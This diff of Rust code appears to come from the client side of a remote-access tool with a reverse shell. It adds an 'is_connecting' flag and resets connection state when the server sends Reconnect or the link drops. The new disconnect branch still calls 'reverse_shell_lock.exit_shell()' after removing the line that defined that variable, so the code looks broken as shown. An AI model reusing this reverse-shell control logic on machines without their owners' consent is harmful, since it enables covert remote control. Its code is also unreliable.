@@ -23,7 +23,8 @@ use crate::features::process::{ process_list, kill_process };
 pub fn handle_server(
     mut read_stream: TcpStream,
     mut write_stream: TcpStream,
-    is_connected: Arc<Mutex<bool>>
+    is_connected: Arc<Mutex<bool>>,
+    is_connecting: Arc<Mutex<bool>>
 ) {
     OsRng.fill(&mut *SECRET.lock().unwrap());
 
@@ -54,6 +55,7 @@ pub fn handle_server(
                     Command::Reconnect => {
                         *crate::SECRET_INITIALIZED.lock().unwrap() = false;
                         *is_connected.lock().unwrap() = false;
+                        *is_connecting.lock().unwrap() = false;
                         break;
                     }
                     Command::Disconnect => {
@@ -153,9 +155,12 @@ pub fn handle_server(
             }
             Err(_) => {
                 println!("Disconnected!");
-                let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
-                reverse_shell_lock.exit_shell();
-                *is_connected.lock().unwrap() = false;
+                {
+                    *crate::SECRET_INITIALIZED.lock().unwrap() = false;
+                    *is_connected.lock().unwrap() = false;
+                    *is_connecting.lock().unwrap() = false;
+                    reverse_shell_lock.exit_shell();
+                }
                 break;
             }
         }
